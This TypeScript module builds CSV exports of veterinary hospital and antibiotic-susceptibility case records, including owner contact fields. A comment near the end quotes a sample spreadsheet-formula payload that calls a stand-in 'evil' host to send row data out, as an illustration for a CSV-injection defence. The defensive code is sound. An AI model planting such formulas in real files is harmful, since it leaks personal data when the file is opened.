import type { Case } from "@shared/schema";
import type { HospitalExportFormColumn } from "../hospital-export-schema";
import {
  appendLegacyExportColumns,
  toStatisticalFormColumns,
} from "../hospital-export-schema";

/** Normalize Express query values (string | string[] | undefined) to a trimmed string. */
export function parseOptionalExportQueryString(value: unknown): string | undefined {
  if (typeof value === "string") {
    const t = value.trim();
    return t || undefined;
  }
  if (Array.isArray(value)) {
    for (const item of value) {
      if (typeof item === "string" && item.trim()) return item.trim();
    }
  }
  return undefined;
}

export function parseExportQueryFilters(query: Record<string, unknown>): {
  dateFrom?: string;
  dateTo?: string;
  species?: string;
} {
  return {
    dateFrom: parseOptionalExportQueryString(query.dateFrom),
    dateTo: parseOptionalExportQueryString(query.dateTo),
    species: parseOptionalExportQueryString(query.species),
  };
}

export type HospitalExportLayout = "clinical" | "statistical";

/** Shared export layout parser (hospital + AST). */
export function parseExportLayout(value: unknown): HospitalExportLayout {
  const raw = typeof value === "string" ? value.trim().toLowerCase() : "";
  if (raw === "statistical" || raw === "full") return "statistical";
  return "clinical";
}

/** @deprecated Use parseExportLayout */
export const parseHospitalExportLayout = parseExportLayout;

/** Students may only download the clinical layout (Option C). */
export function isStatisticalExportAllowed(role: string): boolean {
  return role !== "student";
}

/** @deprecated Use isStatisticalExportAllowed */
export const isHospitalStatisticalExportAllowed = isStatisticalExportAllowed;

type AstItem = {
  antibiotic?: string;
  symbol?: string;
  discContent?: string;
  zoneSize?: string | number;
  sensitivity?: string;
};

export type ExportRow = Record<string, string | number>;

/** Number of fixed AST result columns on the wide (one row per case) export. */
export const AST_WIDE_SLOT_COUNT = 32;

function parseAstResults(astResults: string | null): AstItem[] {
  try {
    const parsed = JSON.parse(astResults || "[]");
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

/** Shared core columns (snake_case) — same order for AST and hospital exports. */
export const CORE_CASE_SNAKE_ORDER = [
  "case_number",
  "case_id",
  "bill_number",
  "date_bs",
  "date_ad",
  "daily_number",
  "monthly_number",
  "yearly_number",
  "owner_name",
  "owner_address",
  "owner_phone",
  "species",
  "breed",
  "animal_name",
  "age",
  "sex",
  "sample_type",
  "sample_date_bs",
  "sample_date_ad",
  "culture_organism",
  "remarks",
  "record_created_at",
  "record_updated_at",
  "last_updated_by_name",
] as const;

/** Hospital-only columns (not in AST exports). */
export const HOSPITAL_EXPORT_EXTRA_ORDER = [
  "attending_veterinarian_name",
  "attending_veterinarian_nvc",
  "attending_veterinarian_department",
  "treatment_prescription",
] as const;

/** Human-readable headers for hospital clinical export (no AST sample/culture fields). */
export const HOSPITAL_CLINICAL_CORE_HEADERS = [
  "Case Number",
  "Bill Number",
  "Case Date (BS)",
  "Case Date (AD)",
  "Owner Name",
  "Owner Address",
  "Owner Phone",
  "Species",
  "Breed",
  "Animal Name",
  "Age",
  "Sex",
  "General Remarks",
  "Attending Veterinarian",
  "Attending Veterinarian NVC",
  "Attending Veterinarian Department",
  "Treatment / Prescription",
] as const;

/** Audit/metadata headers appended only for layout=statistical (clinical labels). */
export const HOSPITAL_AUDIT_HEADERS = [
  "Case ID",
  "Daily Number",
  "Monthly Number",
  "Yearly Number",
  "Record Created At",
  "Record Updated At",
  "Last Updated By",
] as const;

/** Hospital clinical core columns in snake_case (no AST sample/culture fields). */
export const HOSPITAL_STATISTICAL_CORE_ORDER = [
  "case_number",
  "bill_number",
  "date_bs",
  "date_ad",
  "owner_name",
  "owner_address",
  "owner_phone",
  "species",
  "breed",
  "animal_name",
  "age",
  "sex",
  "remarks",
  "attending_veterinarian_name",
  "attending_veterinarian_nvc",
  "attending_veterinarian_department",
  "treatment_prescription",
] as const;

/** Audit/metadata columns for statistical export (hospital + AST). */
export const EXPORT_STATISTICAL_AUDIT_ORDER = [
  "case_id",
  "daily_number",
  "monthly_number",
  "yearly_number",
  "record_created_at",
  "record_updated_at",
  "last_updated_by_name",
] as const;

/** @deprecated Use EXPORT_STATISTICAL_AUDIT_ORDER */
export const HOSPITAL_STATISTICAL_AUDIT_ORDER = EXPORT_STATISTICAL_AUDIT_ORDER;

/** Human-readable AST case columns (clinical export). */
export const AST_CLINICAL_CORE_HEADERS = [
  "Case Number",
  "Bill Number",
  "Case Date (BS)",
  "Case Date (AD)",
  "Owner Name",
  "Owner Address",
  "Owner Phone",
  "Species",
  "Breed",
  "Animal Name",
  "Age",
  "Sex",
  "Sample Type",
  "Sample Date (BS)",
  "Sample Date (AD)",
  "Culture Organism",
  "General Remarks",
] as const;

/** AST clinical core in snake_case (statistical export; no audit fields). */
export const AST_STATISTICAL_CORE_ORDER = [
  "case_number",
  "bill_number",
  "date_bs",
  "date_ad",
  "owner_name",
  "owner_address",
  "owner_phone",
  "species",
  "breed",
  "animal_name",
  "age",
  "sex",
  "sample_type",
  "sample_date_bs",
  "sample_date_ad",
  "culture_organism",
  "remarks",
] as const;

export const AST_CLINICAL_WIDE_COUNT_HEADER = "AST Result Count";

export function astClinicalWideSlotHeader(index: number): string {
  return `AST Result ${String(index + 1).padStart(2, "0")}`;
}

const AST_CLINICAL_LONG_HEADERS = {
  ast_row_index: "AST Row",
  ast_antibiotic: "Antibiotic",
  ast_symbol: "Symbol",
  ast_disc_content: "Disc Content",
  ast_zone_mm: "Zone (mm)",
  ast_sensitivity: "Sensitivity",
} as const;

export type HospitalExportSchema = {
  layout: HospitalExportLayout;
  columns: string[];
  customKeyToHeader: Map<string, string>;
  dynamicColumnStart: number;
  dynamicColumnEnd: number;
};

export type CoreCaseSnakeKey = (typeof CORE_CASE_SNAKE_ORDER)[number];

export function caseCoreSnake(c: Case): Record<CoreCaseSnakeKey, string> {
  return {
    case_number: c.caseNumber,
    case_id: String(c.id),
    bill_number: c.billNumber || "",
    date_bs: c.date,
    date_ad: c.dateAd || "",
    daily_number: c.dailyNumber != null ? String(c.dailyNumber) : "",
    monthly_number: c.monthlyNumber != null ? String(c.monthlyNumber) : "",
    yearly_number: c.yearlyNumber != null ? String(c.yearlyNumber) : "",
    owner_name: c.ownerName,
    owner_address: c.ownerAddress,
    owner_phone: c.ownerPhone,
    species: c.species,
    breed: c.breed,
    animal_name: c.animalName || "",
    age: c.age || "",
    sex: c.sex || "",
    sample_type: c.sampleType || "",
    sample_date_bs: c.sampleDate || "",
    sample_date_ad: c.sampleDateAd || "",
    culture_organism: c.cultureResult || "",
    remarks: c.remarks || "",
    record_created_at: c.createdAt ?? "",
    record_updated_at: c.updatedAt ?? "",
    last_updated_by_name: c.lastUpdatedByName ?? "",
  };
}

/** One readable cell per antibiotic slot (wide export). */
export function formatAstSlot(a: AstItem): string {
  const drug = String(a.antibiotic ?? "").trim();
  const sym = String(a.symbol ?? "").trim();
  const disc = String(a.discContent ?? "").trim();
  const zone = a.zoneSize === null || a.zoneSize === undefined ? "" : String(a.zoneSize).trim();
  const sens = String(a.sensitivity ?? "").trim();
  const namePart = sym ? `${drug} (${sym})` : drug;
  const parts: string[] = [];
  if (namePart) parts.push(namePart);
  if (disc) parts.push(`disc ${disc}`);
  if (zone) parts.push(`${zone} mm`);
  if (sens) parts.push(sens);
  return parts.join(" | ");
}

/**
 * Wide AST export: one row per case, fixed columns (easy filters / pivot in Excel).
 * Extra AST rows beyond {@link AST_WIDE_SLOT_COUNT} are omitted (use long format).
 */
export function toAstWideExportRows(
  casesData: Case[],
  layout: HospitalExportLayout = "clinical",
): ExportRow[] {
  return casesData.map((c) => buildAstWideRow(c, layout));
}

function astCaseClinicalCore(c: Case): ExportRow {
  return {
    "Case Number": c.caseNumber,
    "Bill Number": c.billNumber || "",
    "Case Date (BS)": c.date,
    "Case Date (AD)": c.dateAd || "",
    "Owner Name": c.ownerName,
    "Owner Address": c.ownerAddress,
    "Owner Phone": c.ownerPhone,
    Species: c.species,
    Breed: c.breed,
    "Animal Name": c.animalName || "",
    Age: c.age || "",
    Sex: c.sex || "",
    "Sample Type": c.sampleType || "",
    "Sample Date (BS)": c.sampleDate || "",
    "Sample Date (AD)": c.sampleDateAd || "",
    "Culture Organism": c.cultureResult || "",
    "General Remarks": c.remarks || "",
  };
}

function astCaseStatisticalCore(c: Case): ExportRow {
  return {
    case_number: c.caseNumber,
    bill_number: c.billNumber || "",
    date_bs: c.date,
    date_ad: c.dateAd || "",
    owner_name: c.ownerName,
    owner_address: c.ownerAddress,
    owner_phone: c.ownerPhone,
    species: c.species,
    breed: c.breed,
    animal_name: c.animalName || "",
    age: c.age || "",
    sex: c.sex || "",
    sample_type: c.sampleType || "",
    sample_date_bs: c.sampleDate || "",
    sample_date_ad: c.sampleDateAd || "",
    culture_organism: c.cultureResult || "",
    remarks: c.remarks || "",
  };
}

function exportStatisticalAuditRow(c: Case): ExportRow {
  return {
    case_id: String(c.id),
    daily_number: c.dailyNumber != null ? String(c.dailyNumber) : "",
    monthly_number: c.monthlyNumber != null ? String(c.monthlyNumber) : "",
    yearly_number: c.yearlyNumber != null ? String(c.yearlyNumber) : "",
    record_created_at: c.createdAt ?? "",
    record_updated_at: c.updatedAt ?? "",
    last_updated_by_name: c.lastUpdatedByName ?? "",
  };
}

function buildAstWideRow(c: Case, layout: HospitalExportLayout): ExportRow {
  const astData = parseAstResults(c.astResults);
  if (layout === "clinical") {
    const row: ExportRow = { ...astCaseClinicalCore(c) };
    row[AST_CLINICAL_WIDE_COUNT_HEADER] = String(astData.length);
    for (let i = 0; i < AST_WIDE_SLOT_COUNT; i++) {
      row[astClinicalWideSlotHeader(i)] = astData[i] ? formatAstSlot(astData[i]) : "";
    }
    return row;
  }
  const row: ExportRow = { ...astCaseStatisticalCore(c) };
  row.ast_result_count = String(astData.length);
  for (let i = 0; i < AST_WIDE_SLOT_COUNT; i++) {
    const key = `ast_result_slot_${String(i + 1).padStart(2, "0")}`;
    row[key] = astData[i] ? formatAstSlot(astData[i]) : "";
  }
  return { ...row, ...exportStatisticalAuditRow(c) };
}

const AST_LONG_TAIL = [
  "ast_row_index",
  "ast_antibiotic",
  "ast_symbol",
  "ast_disc_content",
  "ast_zone_mm",
  "ast_sensitivity",
] as const;

/**
 * Long-format AST export: one row per antibiotic (case metadata repeated).
 */
export function toAstLongExportRows(
  casesData: Case[],
  layout: HospitalExportLayout = "clinical",
): ExportRow[] {
  const out: ExportRow[] = [];
  for (const c of casesData) {
    const astData = parseAstResults(c.astResults);
    const clinicalCore = astCaseClinicalCore(c);
    const statisticalCore = astCaseStatisticalCore(c);
    const audit = exportStatisticalAuditRow(c);

    if (astData.length === 0) {
      if (layout === "clinical") {
        out.push({
          ...clinicalCore,
          [AST_CLINICAL_LONG_HEADERS.ast_row_index]: "",
          [AST_CLINICAL_LONG_HEADERS.ast_antibiotic]: "",
          [AST_CLINICAL_LONG_HEADERS.ast_symbol]: "",
          [AST_CLINICAL_LONG_HEADERS.ast_disc_content]: "",
          [AST_CLINICAL_LONG_HEADERS.ast_zone_mm]: "",
          [AST_CLINICAL_LONG_HEADERS.ast_sensitivity]: "",
        });
      } else {
        out.push({
          ...statisticalCore,
          ast_row_index: "",
          ast_antibiotic: "",
          ast_symbol: "",
          ast_disc_content: "",
          ast_zone_mm: "",
          ast_sensitivity: "",
          ...audit,
        });
      }
      continue;
    }

    astData.forEach((a, i) => {
      if (layout === "clinical") {
        out.push({
          ...clinicalCore,
          [AST_CLINICAL_LONG_HEADERS.ast_row_index]: String(i + 1),
          [AST_CLINICAL_LONG_HEADERS.ast_antibiotic]: String(a.antibiotic ?? "").trim(),
          [AST_CLINICAL_LONG_HEADERS.ast_symbol]: String(a.symbol ?? "").trim(),
          [AST_CLINICAL_LONG_HEADERS.ast_disc_content]: String(a.discContent ?? "").trim(),
          [AST_CLINICAL_LONG_HEADERS.ast_zone_mm]:
            a.zoneSize === null || a.zoneSize === undefined ? "" : String(a.zoneSize).trim(),
          [AST_CLINICAL_LONG_HEADERS.ast_sensitivity]: String(a.sensitivity ?? "").trim(),
        });
      } else {
        out.push({
          ...statisticalCore,
          ast_row_index: String(i + 1),
          ast_antibiotic: String(a.antibiotic ?? "").trim(),
          ast_symbol: String(a.symbol ?? "").trim(),
          ast_disc_content: String(a.discContent ?? "").trim(),
          ast_zone_mm:
            a.zoneSize === null || a.zoneSize === undefined ? "" : String(a.zoneSize).trim(),
          ast_sensitivity: String(a.sensitivity ?? "").trim(),
          ...audit,
        });
      }
    });
  }
  return out;
}

export function astWideExportColumnOrder(
  layout: HospitalExportLayout = "clinical",
): readonly string[] {
  const slots = Array.from({ length: AST_WIDE_SLOT_COUNT }, (_, i) => {
    return layout === "clinical"
      ? astClinicalWideSlotHeader(i)
      : `ast_result_slot_${String(i + 1).padStart(2, "0")}`;
  });
  if (layout === "clinical") {
    return [...AST_CLINICAL_CORE_HEADERS, AST_CLINICAL_WIDE_COUNT_HEADER, ...slots];
  }
  return [
    ...AST_STATISTICAL_CORE_ORDER,
    "ast_result_count",
    ...slots,
    ...EXPORT_STATISTICAL_AUDIT_ORDER,
  ];
}

export function astLongExportColumnOrder(
  layout: HospitalExportLayout = "clinical",
): readonly string[] {
  if (layout === "clinical") {
    return [
      ...AST_CLINICAL_CORE_HEADERS,
      ...Object.values(AST_CLINICAL_LONG_HEADERS),
    ];
  }
  return [...AST_STATISTICAL_CORE_ORDER, ...AST_LONG_TAIL, ...EXPORT_STATISTICAL_AUDIT_ORDER];
}

/** @deprecated Use toAstWideExportRows or toAstLongExportRows */
export function toExportRows(casesData: Case[]): ExportRow[] {
  return toAstWideExportRows(casesData);
}

function parseCustomFields(customFields: string | null): Record<string, unknown> {
  try {
    const parsed = JSON.parse(customFields || "{}");
    return parsed && typeof parsed === "object" ? (parsed as Record<string, unknown>) : {};
  } catch {
    return {};
  }
}

export function stringifyCustomValue(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (typeof value === "string" || typeof value === "number" || typeof value === "boolean") {
    const s = String(value);
    return typeof value === "string" ? s.trim() : s;
  }
  if (Array.isArray(value)) {
    return value.map((v) => stringifyCustomValue(v)).filter(Boolean).join("; ");
  }
  if (typeof value === "object") {
    try {
      return JSON.stringify(value);
    } catch {
      return "";
    }
  }
  return String(value);
}

function hospitalCaseClinicalRow(c: Case): ExportRow {
  return {
    "Case Number": c.caseNumber,
    "Bill Number": c.billNumber || "",
    "Case Date (BS)": c.date,
    "Case Date (AD)": c.dateAd || "",
    "Owner Name": c.ownerName,
    "Owner Address": c.ownerAddress,
    "Owner Phone": c.ownerPhone,
    Species: c.species,
    Breed: c.breed,
    "Animal Name": c.animalName || "",
    Age: c.age || "",
    Sex: c.sex || "",
    "General Remarks": c.remarks || "",
    "Attending Veterinarian": c.veterinarianName?.trim() ?? "",
    "Attending Veterinarian NVC": c.veterinarianNvc?.trim() ?? "",
    "Attending Veterinarian Department": c.veterinarianDepartment?.trim() ?? "",
    "Treatment / Prescription": formatTreatmentDetailsExport(c.treatmentDetails),
  };
}

function hospitalCaseStatisticalRow(c: Case): ExportRow {
  return {
    case_number: c.caseNumber,
    bill_number: c.billNumber || "",
    date_bs: c.date,
    date_ad: c.dateAd || "",
    owner_name: c.ownerName,
    owner_address: c.ownerAddress,
    owner_phone: c.ownerPhone,
    species: c.species,
    breed: c.breed,
    animal_name: c.animalName || "",
    age: c.age || "",
    sex: c.sex || "",
    remarks: c.remarks || "",
    attending_veterinarian_name: c.veterinarianName?.trim() ?? "",
    attending_veterinarian_nvc: c.veterinarianNvc?.trim() ?? "",
    attending_veterinarian_department: c.veterinarianDepartment?.trim() ?? "",
    treatment_prescription: formatTreatmentDetailsExport(c.treatmentDetails),
  };
}

function hospitalCaseStatisticalAuditRow(c: Case): ExportRow {
  return exportStatisticalAuditRow(c);
}

function formatTreatmentDetailsExport(raw: string | null): string {
  if (!raw?.trim()) return "";
  try {
    const parsed = JSON.parse(raw) as Record<
      string,
      { medications?: Array<Record<string, string>>; generalInstructions?: string }
    >;
    const chunks: string[] = [];
    for (const block of Object.values(parsed)) {
      if (!block || typeof block !== "object") continue;
      if (Array.isArray(block.medications)) {
        for (const med of block.medications) {
          if (!med || typeof med !== "object") continue;
          const line = [
            med.medication,
            med.dose,
            med.doseUnit,
            med.route,
            med.frequency,
            med.duration,
            med.note,
          ]
            .map((x) => String(x ?? "").trim())
            .filter(Boolean)
            .join(" ");
          if (line) chunks.push(line);
        }
      }
      const gi = String(block.generalInstructions ?? "").trim();
      if (gi) chunks.push(gi);
    }
    return chunks.join(" | ");
  } catch {
    return raw.trim();
  }
}

/** Collect every custom_fields key present in the export batch. */
export function collectHospitalCustomFieldKeys(casesData: Case[]): Set<string> {
  const keys = new Set<string>();
  for (const c of casesData) {
    const fields = parseCustomFields(c.customFields);
    for (const key of Object.keys(fields)) keys.add(key);
  }
  return keys;
}

/** Build export schema: clinical core, form-ordered dynamic fields, optional audit tail. */
export function buildHospitalExportSchema(
  layout: HospitalExportLayout,
  formColumns: HospitalExportFormColumn[],
  dataCustomKeys: Iterable<string>,
): HospitalExportSchema {
  if (layout === "statistical") {
    const reserved = new Set<string>([
      ...HOSPITAL_STATISTICAL_CORE_ORDER,
      ...HOSPITAL_STATISTICAL_AUDIT_ORDER,
    ]);
    const statisticalForm = toStatisticalFormColumns(formColumns, reserved);
    const dynamicColumns = appendLegacyExportColumns(
      statisticalForm,
      dataCustomKeys,
      reserved,
      "statistical",
    );
    const customKeyToHeader = new Map(dynamicColumns.map((c) => [c.key, c.header]));
    const core = [...HOSPITAL_STATISTICAL_CORE_ORDER];
    const dynamicHeaders = dynamicColumns.map((c) => c.header);
    const audit = [...HOSPITAL_STATISTICAL_AUDIT_ORDER];
    const columns = [...core, ...dynamicHeaders, ...audit];
    return {
      layout,
      columns,
      customKeyToHeader,
      dynamicColumnStart: core.length,
      dynamicColumnEnd: core.length + dynamicHeaders.length,
    };
  }

  const reserved = new Set<string>([...HOSPITAL_CLINICAL_CORE_HEADERS]);
  const dynamicColumns = appendLegacyExportColumns(
    formColumns,
    dataCustomKeys,
    reserved,
    "clinical",
  );
  const customKeyToHeader = new Map(dynamicColumns.map((c) => [c.key, c.header]));
  const clinical = [...HOSPITAL_CLINICAL_CORE_HEADERS];
  const dynamicHeaders = dynamicColumns.map((c) => c.header);
  const columns = [...clinical, ...dynamicHeaders];
  return {
    layout,
    columns,
    customKeyToHeader,
    dynamicColumnStart: clinical.length,
    dynamicColumnEnd: clinical.length + dynamicHeaders.length,
  };
}

/** Drop dynamic columns that are empty for every row in the batch. */
export function pruneEmptyDynamicExportColumns(
  rows: ExportRow[],
  schema: HospitalExportSchema,
): string[] {
  if (rows.length === 0) return [...schema.columns];
  const { columns, dynamicColumnStart, dynamicColumnEnd } = schema;
  const before = columns.slice(0, dynamicColumnStart);
  const dynamic = columns.slice(dynamicColumnStart, dynamicColumnEnd);
  const after = columns.slice(dynamicColumnEnd);
  const keptDynamic = dynamic.filter((header) =>
    rows.some((row) => String(row[header] ?? "").trim() !== ""),
  );
  return [...before, ...keptDynamic, ...after];
}

/** One row per hospital case with human-readable headers and form-ordered custom fields. */
export function toHospitalExportRows(
  casesData: Case[],
  schema: HospitalExportSchema,
): ExportRow[] {
  return casesData.map((c) => {
    const row: ExportRow =
      schema.layout === "statistical"
        ? {
            ...hospitalCaseStatisticalRow(c),
            ...hospitalCaseStatisticalAuditRow(c),
          }
        : { ...hospitalCaseClinicalRow(c) };
    const customFields = parseCustomFields(c.customFields);
    for (const [key, header] of Array.from(schema.customKeyToHeader.entries())) {
      row[header] = stringifyCustomValue(customFields[key]);
    }
    return row;
  });
}

/** Column order for hospital export; prunes empty dynamic columns when rows are present. */
export function hospitalExportColumnOrder(
  rows: ExportRow[],
  schema: HospitalExportSchema,
): string[] {
  return pruneEmptyDynamicExportColumns(rows, schema);
}

/**
 * @deprecated Legacy snake_case hospital export column list.
 * Prefer buildHospitalExportSchema + hospitalExportColumnOrder.
 */
export function legacyHospitalExportColumnOrder(rows: ExportRow[]): string[] {
  if (rows.length === 0) {
    return [...CORE_CASE_SNAKE_ORDER, ...HOSPITAL_EXPORT_EXTRA_ORDER];
  }
  const fixedSet = new Set<string>([
    ...CORE_CASE_SNAKE_ORDER,
    ...HOSPITAL_EXPORT_EXTRA_ORDER,
  ]);
  const dynamicKeys = Object.keys(rows[0])
    .filter((k) => !fixedSet.has(k))
    .sort((a, b) => a.localeCompare(b));
  return [...CORE_CASE_SNAKE_ORDER, ...HOSPITAL_EXPORT_EXTRA_ORDER, ...dynamicKeys];
}

/**
 * ASCII-safe download filename including date range and (for AST) wide vs long layout.
 */
export function buildExportCsvFilename(options: {
  scope: "ast" | "hospital";
  dateFrom?: string;
  dateTo?: string;
  astLayout?: "wide" | "long";
  exportLayout?: HospitalExportLayout;
  hospitalLayout?: HospitalExportLayout;
  species?: string;
}): string {
  const sanitizeDate = (s: string | undefined) => {
    if (!s?.trim()) return "any";
    const t = s.trim().replace(/[^\d-]/g, "");
    return t.length > 0 ? t : "any";
  };
  const sanitizeSpecies = (s: string | undefined) => {
    if (!s?.trim()) return "";
    const t = s
      .trim()
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-+|-+$/g, "");
    return t ? `_species-${t}` : "";
  };
  const clinicalStat =
    options.exportLayout ?? options.hospitalLayout ?? "clinical";
  const layout =
    options.scope === "ast"
      ? `${clinicalStat === "statistical" ? "-statistical" : "-clinical"}${options.astLayout === "long" ? "-long" : "-wide"}`
      : clinicalStat === "statistical"
        ? "-statistical"
        : "-clinical";
  return `${options.scope}-export${layout}_${sanitizeDate(options.dateFrom)}_to_${sanitizeDate(options.dateTo)}${sanitizeSpecies(options.species)}.csv`;
}

/**
 * Defuse CSV formula injection (Excel / Sheets / Numbers).
 *
 * Any cell that *starts* with `=`, `+`, `-`, `@`, `\t`, or `\r` is parsed
 * as a formula by Excel — even inside quoted fields. A malicious owner
 * name like `=HYPERLINK("http://evil/?c="&A1, "Click me")` would silently
 * exfiltrate the row on open. Prefixing with a single apostrophe (`'`)
 * forces Excel to treat the cell as a literal string. Apostrophes get
 * stripped by Excel on display, so the visible value is unchanged.
 *
 * See OWASP "CSV Injection" cheat sheet.
 */
export function defuseSpreadsheetFormula(value: string): string {
  if (!value) return value;
  const first = value.charAt(0);
  if (first === "=" || first === "+" || first === "-" || first === "@" || first === "\t" || first === "\r") {
    return `'${value}`;
  }
  return value;
}

function escapeCsvCell(value: string): string {
  const safe = defuseSpreadsheetFormula(value);
  const val = safe.replace(/"/g, '""');
  return `"${val}"`;
}

/**
 * RFC-style CSV: UTF-8 BOM (Excel-friendly), CRLF newlines, quoted fields, stable column order.
 */
export function rowsToCsv(rows: ExportRow[], columnOrder?: readonly string[]): string {
  // Zero rows: emit a header-only CSV when we know the column order, so the
  // download is a valid spreadsheet that the user can open and inspect.
  // Falls back to the legacy "No data" placeholder only when we have no
  // schema to render (caller didn't pass `columnOrder`).
  if (rows.length === 0) {
    if (!columnOrder || columnOrder.length === 0) return "No data";
    const headerLine = columnOrder
      .map((c) => `"${String(c).replace(/"/g, '""')}"`)
      .join(",");
    return "\uFEFF" + headerLine + "\r\n";
  }

  const headers =
    columnOrder && columnOrder.length > 0
      ? [...columnOrder]
      : (Object.keys(rows[0]) as string[]);

  const csvLines = [
    headers.map((h) => escapeCsvCell(h)).join(","),
    ...rows.map((row) =>
      headers
        .map((h) => {
          const raw = row[h];
          return escapeCsvCell(String(raw ?? ""));
        })
        .join(","),
    ),
  ];

  return `\uFEFF${csvLines.join("\r\n")}`;
}

/** @deprecated Use astWideExportColumnOrder */
export function astExportColumnOrder(): readonly string[] {
  return astWideExportColumnOrder();
}
